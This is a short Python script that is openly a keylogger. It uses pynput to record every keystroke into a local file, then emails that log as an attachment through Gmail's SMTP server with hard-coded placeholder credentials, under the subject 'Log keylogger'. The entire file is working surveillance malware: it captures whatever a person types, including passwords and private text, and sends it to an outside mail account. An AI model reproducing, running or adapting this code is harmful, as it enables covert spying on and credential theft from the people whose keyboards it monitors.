from pynput import keyboard
import smtplib
from email.message import EmailMessage
import os

def log(text):
    with open('log.txt', 'a') as file_log:
        file_log.write(text)

def on_press(key):
    try:
        log(key.char)
    except AttributeError:
        log(" <" + str(key) + "> ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

msg = EmailMessage()
msg['Subject'] = 'Log keylogger'
msg['From'] = 'teste@gmail.com'
msg['To'] = 'teste@gmail.com'
msg.set_content('Log attached...')

with open('log.txt', 'r') as f:
    file_data = f.read()
    file_name = f.name

msg.add_attachment(file_data, filename=file_name)

with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
    smtp.login('teste@gmail.com', 'teste123')
    smtp.send_message(msg)  
    print("Chegou aqui!")